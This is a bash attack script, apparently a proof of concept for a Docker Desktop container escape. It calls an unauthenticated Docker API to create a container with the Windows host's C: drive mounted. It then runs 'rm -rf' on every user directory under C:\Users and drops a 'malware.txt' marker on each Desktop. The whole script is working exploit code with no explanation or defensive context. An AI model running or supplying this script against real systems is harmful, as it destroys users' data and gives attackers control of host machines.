#!/usr/bin/bash

DOCKER_API="http://192.168.65.7:2375"
IMAGE="alpine"
MOUNT_PATH="/mnt/host/c:/mnt/host_c"

echo "[*] Creating container with C: bind mount..."
CONTAINER_ID=$(curl -s -X POST "$DOCKER_API/containers/create" \
  -H "Content-Type: application/json" \
  -d "{
    \"Image\": \"$IMAGE\",
    \"Cmd\": [\"sh\"],
    \"Tty\": true,
    \"OpenStdin\": true,
    \"HostConfig\": {
      \"Binds\": [\"$MOUNT_PATH\"]
    }
  }" | grep -o '"Id":"[^"]*"' | cut -d':' -f2 | tr -d '"')

echo "[+] Container created: $CONTAINER_ID"

echo "[*] Starting container..."
curl -s -X POST "$DOCKER_API/containers/$CONTAINER_ID/start"

### Step 1: List all users under C:\Users
echo "[*] Listing Windows user directories..."
EXEC_ID=$(curl -s -X POST "$DOCKER_API/containers/$CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{
    "AttachStdout": true,
    "AttachStderr": true,
    "Tty": false,
    "Cmd": ["ls", "/mnt/host_c/Users"]
  }' | grep -o '"Id":"[^"]*"' | cut -d':' -f2 | tr -d '"')

USER_LIST=$(curl -s -X POST "$DOCKER_API/exec/$EXEC_ID/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach": false, "Tty": false}' | tr -d '\r')

echo "[+] Found users:"
echo "$USER_LIST"

### Step 2: Loop through each user
for USER in $USER_LIST; do
  echo "----------------------------------------"
  echo "[*] Targeting user: $USER"

  ### Attempt to delete user directory
  echo "[*] Attempting to delete /mnt/host_c/Users/$USER"
  EXEC_ID=$(curl -s -X POST "$DOCKER_API/containers/$CONTAINER_ID/exec" \
    -H "Content-Type: application/json" \
    -d "{
      \"AttachStdout\": true,
      \"AttachStderr\": true,
      \"Tty\": false,
      \"Cmd\": [\"rm\", \"-rf\", \"/mnt/host_c/Users/$USER\"]
    }" | grep -o '"Id":"[^"]*"' | cut -d':' -f2 | tr -d '"')

  DELETE_RESULT=$(curl -s -X POST "$DOCKER_API/exec/$EXEC_ID/start" \
    -H "Content-Type: application/json" \
    -d '{"Detach": false, "Tty": false}')

  echo "[↪] Delete result:"
  echo "$DELETE_RESULT"

  ### Attempt to inject malware
  echo "[*] Injecting malware into $USER's Desktop..."
  EXEC_ID=$(curl -s -X POST "$DOCKER_API/containers/$CONTAINER_ID/exec" \
    -H "Content-Type: application/json" \
    -d "{
      \"AttachStdout\": true,
      \"AttachStderr\": true,
      \"Tty\": false,
      \"Cmd\": [\"sh\", \"-c\", \"echo hacked > /mnt/host_c/Users/$USER/Desktop/malware.txt\"]
    }" | grep -o '"Id":"[^"]*"' | cut -d':' -f2 | tr -d '"')

  INJECT_RESULT=$(curl -s -X POST "$DOCKER_API/exec/$EXEC_ID/start" \
    -H "Content-Type: application/json" \
    -d '{"Detach": false, "Tty": false}')

  echo "[↪] Injection result:"
  echo "$INJECT_RESULT"

  echo "[✓] Finished processing $USER"
done

echo "========================================"
echo "[✓] All users processed."
